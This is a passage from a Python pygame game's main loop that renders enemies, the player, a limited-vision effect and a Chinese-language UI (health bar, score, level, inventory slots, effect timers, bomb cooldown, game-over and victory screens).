                health_ratio = enemy['health'] / ENEMY_HEALTH

            health_width = ENEMY_SIZE * health_ratio
            health_bar = pygame.Rect(enemy['rect'].x, enemy['rect'].y - 5, health_width, 3)
            pygame.draw.rect(map_surface, GREEN, health_bar)

        # 绘制玩家
        player_color = BLUE
        if game_state['invulnerability_timer'] > 0 and frame_count % 6 < 3:
            player_color = LIGHT_BLUE
        pygame.draw.rect(map_surface, player_color, game_state['player'])

        # 将地图绘制到屏幕
        screen.blit(map_surface, (-game_state['camera_x'], -game_state['camera_y']))

        # 绘制视野限制
        draw_vision_effect(screen, (SCREEN_WIDTH//2, SCREEN_HEIGHT//2), PLAYER_VISION_RADIUS)

        # 绘制UI
        font = get_chinese_font(20)

        # 绘制血条
        health_ratio = game_state['player_health'] / PLAYER_MAX_HEALTH
        health_width = 200 * health_ratio
        pygame.draw.rect(screen, RED, (20, 20, 200, 20))
        pygame.draw.rect(screen, GREEN, (20, 20, health_width, 20))
        pygame.draw.rect(screen, WHITE, (20, 20, 200, 20), 2)

        health_text = font.render(f"生命值: {int(game_state['player_health'])}/{PLAYER_MAX_HEALTH}", True, WHITE)
        screen.blit(health_text, (25, 22))

        # 绘制分数和等级
        score_text = font.render(f"分数: {game_state['score']}", True, WHITE)
        level_text = font.render(f"关卡: {game_state['level']}", True, WHITE)
        screen.blit(score_text, (20, 50))
        screen.blit(level_text, (20, 80))

        # 绘制道具栏
        for i in range(8):
            slot_rect = pygame.Rect(20 + i*45, SCREEN_HEIGHT - 50, 40, 40)
            pygame.draw.rect(screen, GRAY, slot_rect)
            pygame.draw.rect(screen, WHITE, slot_rect, 2)

            if game_state['inventory'][i] is not None:
                item_color = ITEM_COLORS[game_state['inventory'][i]]
                pygame.draw.rect(screen, item_color, slot_rect.inflate(-8, -8))

            slot_text = font.render(str(i+1), True, WHITE)
            screen.blit(slot_text, (slot_rect.x + 15, slot_rect.y + 12))

        # 绘制效果图标
        effect_y = 110
        for effect_name, effect_data in game_state['active_effects'].items():
            if effect_data['timer'] > 0:
                effect_text = font.render(f"{effect_name}: {effect_data['timer']//FPS}s", True, YELLOW)
                screen.blit(effect_text, (20, effect_y))
                effect_y += 25

        # 绘制炸弹冷却
        if game_state['bomb_cooldown'] > 0:
            bomb_text = font.render(f"炸弹冷却: {game_state['bomb_cooldown']//FPS + 1}s", True, ORANGE)
            screen.blit(bomb_text, (SCREEN_WIDTH - 150, 20))

        # 绘制隐藏道具消息
        if game_state['hidden_item_message_timer'] > 0:
            message_text = font.render(game_state['hidden_item_message'], True, GOLD)
            screen.blit(message_text, (SCREEN_WIDTH//2 - message_text.get_width()//2, 150))

        # 游戏结束或胜利画面
        if game_state['game_over']:
            overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 180))
            screen.blit(overlay, (0, 0))

            game_over_font = get_chinese_font(48)
            game_over_text = game_over_font.render("游戏结束", True, RED)
            score_text = font.render(f"最终分数: {game_state['score']}", True, WHITE)
            restart_text = font.render("按 R 键重新开始", True, WHITE)

            screen.blit(game_over_text, (SCREEN_WIDTH//2 - game_over_text.get_width()//2, SCREEN_HEIGHT//2 - 60))
            screen.blit(score_text, (SCREEN_WIDTH//2 - score_text.get_width()//2, SCREEN_HEIGHT//2))
            screen.blit(restart_text, (SCREEN_WIDTH//2 - restart_text.get_width()//2, SCREEN_HEIGHT//2 + 40))

        elif game_state['victory']:
            overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 180))
            screen.blit(overlay, (0, 0))

            victory_font = get_chinese_font(48)
            victory_text = victory_font.render("胜利!", True, GREEN)
            level_text = font.render(f"当前关卡: {game_state['level']}", True, WHITE)
            score_text = font.render(f"分数: {game_state['score']}", True, WHITE)
            restart_text = font.render("按 R 键进入下一关", True, WHITE)

            screen.blit(victory_text, (SCREEN_WIDTH//2 - victory_text.get_width()//2, SCREEN_HEIGHT//2 - 60))
            screen.blit(level_text, (SCREEN_WIDTH//2 - level_text.get_width()//2, SCREEN_HEIGHT//2 - 20))
            screen.blit(score_text, (SCREEN_WIDTH//2 - score_text.get_width()//2, SCREEN_HEIGHT//2 + 10))
            screen.blit(restart_text, (SCREEN_WIDTH//2 - restart_text.get_width()//2, SCREEN_HEIGHT//2 + 40))

        pygame.display.flip()
        clock.tick(FPS)

    pygame.quit()

if __name__ == "__main__":
    main()